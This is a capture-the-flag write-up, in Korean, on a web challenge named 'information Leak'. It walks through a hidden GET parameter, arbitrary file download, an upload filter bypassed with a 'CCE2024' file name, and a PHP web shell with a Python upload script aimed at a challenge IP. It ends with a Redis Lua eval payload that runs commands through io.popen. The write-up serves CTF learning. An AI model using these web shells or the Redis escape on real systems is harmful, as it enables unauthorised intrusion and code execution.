# information Leak
## 개요
페이지의 소스코드를 잘 보고 php를 분석하고 웹쉘을 통해 익스하면 된다.
## 풀이
별다른 소스코드가 제공되지 않으므로 루트를 탐색해가며 문제를 풀어야한다. 

우선 첫 화면인 login.html에서 confirm에 어떤 이벤트 리스너가 있는지 확인한다.
![alt](./res/Xp0sdFeq4.png)

```js
// Try access at admin.php
 var xhr = new XMLHttpRequest();
var url = "save.php?loginfmt=" + encodeURIComponent(loginfmtValue) + "&hidden_navigate=" + encodeURIComponent(hidden_navigateValue);
xhr.open("GET", url, true);
xhr.onreadystatechange = function () {
    if (xhr.readyState == 4 && xhr.status == 200) {
        window.location.href = "resetpassword.html";
    }
};
```
코드에서 `save.php?loginfmt=123&hidden_navigate=0`으로 get요청을 날리는것을 알 수 이다. hidden_navigate값을 1로 바꾸고 다시 요청을 보내면

```
Password saved successfully to pw.txt
```
라는 문구가 등장한다. 이렇게 되면 admin.php에 접속이 가능해진다.

또한 문구에서 나오듯이 /pw.txt 를 확인해보면
이상하게 pw.zip파일이 다운로드 된다. 구조를 보면 xlsx파일임을 확인할 수 있고, 확인해보면

```php
$filename = isset($_POST['filename']) ? htmlspecialchars($_POST['filename']) : 'default.xlsx';
$contentA = isset($_POST['contentA']) ? htmlspecialchars($_POST['contentA']) : 'id.txt';
$contentB = isset($_POST['contentB']) ? htmlspecialchars($_POST['contentB']) : 'pw.txt';

if ($contentB !== "pw.txt") {
    echo "Monitoring is worked";
    exit;
}

if (!file_exists($contentA) || !file_exists($contentB)) {
    http_response_code(404); // Not Found
    echo "One or more files are missing.";
    exit;
}
```
이런 내용을 확인 할 수 있다. /admin.php 에 접속해보면, 
![alt](./res/1RtpVg96Ee.png)
약간 불건전(?)해 보이는 사이트를 무시하고
```js
var postData = {
    filename: "leak.xlsx",
    contentA : "id.txt",
    contentB : "pw.txt"
};

$.ajax({
    type: "POST",
    url: "./download.php",
    data: postData,
    xhrFields: {
        responseType: 'blob'
    },
})
```
download.php에서 filename, contentA, contentA 를 전달하는 것을 확인할 수 있다. 앞서 pw.zip에서 얻은 내용이 download.php의 내용임을 알 수 있다.

contentA에 원하는 파일을 contentB에 pw.txt를 입력하면 contentA에 해당하는 파일을 얻을 수 있다. 

그래서 save.php, admin.php, download.php를 다운받아줬다. 
이후 30분째 진전이 없다가 정말 운이 좋게 admin.php의 CSS부분에서
```css
.upload-btn-wrapper input[type=file] {
    font-size: 100px;
    position: absolute;
    left: 0;
    top: 0;
    opacity: 0;
    cursor: pointer;
}
```
위 CSS에 적용되는 태그가 없다. 즉 코드가 사라지고 CSS만 남았음을 직감할 수 있다. 그래서 upload.php의 존재를 확인하게 되었다.

```php
if (strpos($fileBaseName, 'CCE2024') !== false) {
    $isFileValid = true;
} else {
    $isFileValid = in_array($fileMimeType, $allowedImageMimeTypes);
}
```
되게 검사가 엄격할 것 같지만 파일 이름에 CCE2024라는 이름만 들어가면 허용됨을 알 수 있다.


```php
<?php
echo "<pre>";
print_r(shell_exec("tree /"));
echo "</pre>";
?>
```
POST방식으로 위 코드를 `tempCCE2024.php`로 만들어 업로드 하면 성공적으로 업로드 된다.

이후 응답헤더의 x-upload-path를 Base64 디코딩하면, 
`/usr/local/cce/uploads/<my_ip>/66ae3a83289212.30139045.php`라는 경로가 나온다.

_req.py_
```py
import requests, base64
files = open('./tempCCE2024.php', 'rb')
req = requests.post('http://52.231.143.221:4000/upload.php', files={'file':files})
path = base64.b64decode(req.headers['x-upload-path'])
path = path.decode('ascii')
shell = '/'.join(path.split('/')[4:])
print(shell)
print()
print(requests.get('http://52.231.143.221:4000/'+shell).text)
```

_tempCCE2024.php_
```php
<?php
    exec('ls /', $output);
    foreach ($output as $val) {
        echo $val . '\n';
    }
?>
```

위와 같이 웹쉘을 구성한다.

이후 파일구조를 트래킹해가보면 `/usr/local/secret/secret.txt`에서 redis shell로 접속하라는 힌트가 있다. 

보니까 redis가 172.40.0.10에서 돌고 있었다.

이후 할 수 있는게 없었는데, redis의 버전을 확인하고 취약점이 있나 확인해 보니 rce 취약점이 존재했다.

`eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0`

이것으로 flag를 획득할 수 있다.